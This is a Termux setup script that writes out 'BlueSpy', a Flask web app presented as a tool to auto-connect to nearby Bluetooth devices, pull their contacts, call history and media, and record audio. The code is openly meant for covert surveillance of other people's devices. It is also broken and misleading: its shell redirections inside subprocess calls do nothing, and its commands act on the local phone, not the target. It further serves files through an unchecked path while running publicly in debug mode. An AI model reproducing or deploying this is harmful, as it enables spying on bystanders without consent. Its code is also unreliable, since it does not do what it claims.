#!/data/data/com.termux/files/usr/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Print with color
print_color() {
    echo -e "${2}${1}${NC}"
}

# Check if running in Termux
if [ ! -d "/data/data/com.termux" ]; then
    print_color "This script must be run in Termux!" "$RED"
    exit 1
fi

# Function to check if a package is installed
check_package() {
    if ! command -v $1 &> /dev/null; then
        return 1
    fi
    return 0
}

# Function to install packages
install_package() {
    print_color "Installing $1..." "$BLUE"
    pkg install -y $1
}

# Update package list
print_color "Updating package list..." "$YELLOW"
pkg update -y

# Install required packages
print_color "Installing required packages..." "$YELLOW"
pkg install -y python bluetooth pulseaudio termux-api

# Install Python packages
print_color "Installing Python packages..." "$YELLOW"
pip install flask blinker click itsdangerous jinja2 markupsafe werkzeug

# Create necessary directories
print_color "Creating project directories..." "$BLUE"
mkdir -p templates recordings extracted_data

# Initialize devices.json
print_color "Initializing devices.json..." "$BLUE"
echo "[]" > devices.json

# Setup Bluetooth
print_color "Setting up Bluetooth..." "$YELLOW"
pulseaudio --start
pactl load-module module-bluetooth-discover

# Create a modified version of web_interface.py for Termux
print_color "Creating Termux-compatible web interface..." "$BLUE"
cat > web_interface_termux.py << 'EOL'
from flask import Flask, render_template, jsonify, send_file, request, send_from_directory
import os
from datetime import datetime
import json
import subprocess
import threading
import time
import re

app = Flask(__name__)

# Directory to store recordings
RECORDINGS_DIR = "recordings"
if not os.path.exists(RECORDINGS_DIR):
    os.makedirs(RECORDINGS_DIR)

# Global variables for scanning
is_scanning = False
scan_thread = None

DEVICES_FILE = 'devices.json'
EXTRACTED_DATA_DIR = 'extracted_data'

# Create necessary directories
for directory in [RECORDINGS_DIR, EXTRACTED_DATA_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory)

def get_termux_bluetooth_devices():
    """Get Bluetooth devices using Termux API"""
    try:
        # Start scanning
        subprocess.run(['termux-bluetooth-scan'], capture_output=True)
        time.sleep(5)  # Scan for 5 seconds
        
        # Get devices
        result = subprocess.run(['termux-bluetooth-devices'], capture_output=True, text=True)
        devices = []
        
        for line in result.stdout.split('\n'):
            if line.strip():
                parts = line.strip().split()
                if len(parts) >= 2:
                    address = parts[0]
                    name = ' '.join(parts[1:])
                    
                    # Get device info
                    info = subprocess.run(['termux-bluetooth-info', address], capture_output=True, text=True)
                    rssi = re.search(r'RSSI: (-?\d+)', info.stdout)
                    rssi_value = int(rssi.group(1)) if rssi else 0
                    
                    devices.append({
                        'name': name,
                        'address': address,
                        'type': 'Unknown',
                        'status': 'disconnected',
                        'info': info.stdout,
                        'rssi': rssi_value
                    })
        
        return devices
    except Exception as e:
        print(f"Error getting Termux Bluetooth devices: {e}")
        return []

def extract_device_data(device_address):
    """Extract data from connected device using Termux API"""
    try:
        device_dir = os.path.join(EXTRACTED_DATA_DIR, device_address)
        if not os.path.exists(device_dir):
            os.makedirs(device_dir)

        # Create subdirectories for different types of data
        for subdir in ['contacts', 'call_history', 'media', 'recordings']:
            os.makedirs(os.path.join(device_dir, subdir), exist_ok=True)

        # Extract contacts using Termux API
        subprocess.run(['termux-contact-list', '>', os.path.join(device_dir, 'contacts', 'contacts.txt')])
        
        # Extract call history
        subprocess.run(['termux-call-log', '>', os.path.join(device_dir, 'call_history', 'calls.txt')])
        
        # Extract media files
        subprocess.run(['termux-media-scan', os.path.join(device_dir, 'media')])

        return True
    except Exception as e:
        print(f"Error extracting data: {e}")
        return False

def start_live_recording(device_address):
    """Start live recording using Termux API"""
    try:
        recording_dir = os.path.join(EXTRACTED_DATA_DIR, device_address, 'recordings')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        recording_file = os.path.join(recording_dir, f'live_recording_{timestamp}.wav')
        
        # Start recording using Termux API
        subprocess.Popen(['termux-microphone-record', '-f', recording_file])
        
        return recording_file
    except Exception as e:
        print(f"Error starting recording: {e}")
        return None

def stop_live_recording(recording_file):
    """Stop live recording"""
    try:
        subprocess.run(['termux-microphone-stop'])
        return True
    except Exception as e:
        print(f"Error stopping recording: {e}")
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/scan', methods=['POST'])
def scan_bluetooth_devices():
    try:
        auto_connect = request.json.get('auto_connect', False)
        devices = get_termux_bluetooth_devices()
        
        # Sort devices by signal strength (RSSI)
        devices.sort(key=lambda x: x.get('rssi', 0), reverse=True)
        
        # If auto-connect is enabled, connect to the strongest device
        if auto_connect and devices:
            nearest_device = devices[0]
            try:
                subprocess.run(['termux-bluetooth-connect', nearest_device['address']])
                nearest_device['status'] = 'connected'
                extract_device_data(nearest_device['address'])
            except Exception as e:
                print(f"Error connecting to device: {e}")
        
        return jsonify({'devices': devices})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/<address>/data')
def get_device_data(address):
    """Get extracted data from device"""
    try:
        device_dir = os.path.join(EXTRACTED_DATA_DIR, address)
        if not os.path.exists(device_dir):
            return jsonify({'error': 'No data found for device'}), 404

        data = {
            'contacts': [],
            'call_history': [],
            'media': [],
            'recordings': []
        }

        # Get contacts
        contacts_dir = os.path.join(device_dir, 'contacts')
        if os.path.exists(contacts_dir):
            for file in os.listdir(contacts_dir):
                data['contacts'].append({
                    'name': file,
                    'path': f'/api/device/{address}/data/contacts/{file}'
                })

        # Get call history
        calls_dir = os.path.join(device_dir, 'call_history')
        if os.path.exists(calls_dir):
            for file in os.listdir(calls_dir):
                data['call_history'].append({
                    'name': file,
                    'path': f'/api/device/{address}/data/call_history/{file}'
                })

        # Get media files
        media_dir = os.path.join(device_dir, 'media')
        if os.path.exists(media_dir):
            for file in os.listdir(media_dir):
                if file.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.mov')):
                    data['media'].append({
                        'name': file,
                        'path': f'/api/device/{address}/data/media/{file}'
                    })

        # Get recordings
        recordings_dir = os.path.join(device_dir, 'recordings')
        if os.path.exists(recordings_dir):
            for file in os.listdir(recordings_dir):
                if file.endswith('.wav'):
                    data['recordings'].append({
                        'name': file,
                        'path': f'/api/device/{address}/data/recordings/{file}'
                    })

        return jsonify(data)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/<address>/data/<data_type>/<filename>')
def get_device_file(address, data_type, filename):
    """Serve device data files"""
    try:
        file_path = os.path.join(EXTRACTED_DATA_DIR, address, data_type, filename)
        return send_file(file_path)
    except Exception as e:
        return jsonify({'error': str(e)}), 404

@app.route('/api/device/<address>/record/start', methods=['POST'])
def start_recording(address):
    """Start recording from device"""
    try:
        recording_file = start_live_recording(address)
        if recording_file:
            return jsonify({'status': 'success', 'file': recording_file})
        return jsonify({'error': 'Failed to start recording'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/device/<address>/record/stop', methods=['POST'])
def stop_recording(address):
    """Stop recording from device"""
    try:
        if stop_live_recording(None):
            return jsonify({'status': 'success'})
        return jsonify({'error': 'Failed to stop recording'}), 500
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    print("Starting BlueSpy web interface on Termux")
    print("Open your browser and go to: http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)
EOL

# Create a run script
print_color "Creating run script..." "$BLUE"
cat > run_termux.sh << 'EOL'
#!/data/data/com.termux/files/usr/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Print with color
print_color() {
    echo -e "${2}${1}${NC}"
}

# Check if running in Termux
if [ ! -d "/data/data/com.termux" ]; then
    print_color "This script must be run in Termux!" "$RED"
    exit 1
fi

# Start PulseAudio
print_color "Starting PulseAudio..." "$YELLOW"
pulseaudio --start

# Load Bluetooth module
print_color "Loading Bluetooth module..." "$YELLOW"
pactl load-module module-bluetooth-discover

# Start the web interface
print_color "Starting BlueSpy web interface..." "$GREEN"
python web_interface_termux.py
EOL

# Make scripts executable
print_color "Making scripts executable..." "$BLUE"
chmod +x termux_setup.sh run_termux.sh

print_color "\nSetup complete! To run the project:" "$GREEN"
print_color "1. Run: ./run_termux.sh" "$YELLOW"
print_color "2. Open http://localhost:5000 in your browser" "$YELLOW"
print_color "\nNote: Make sure Bluetooth is enabled in Termux settings" "$BLUE" 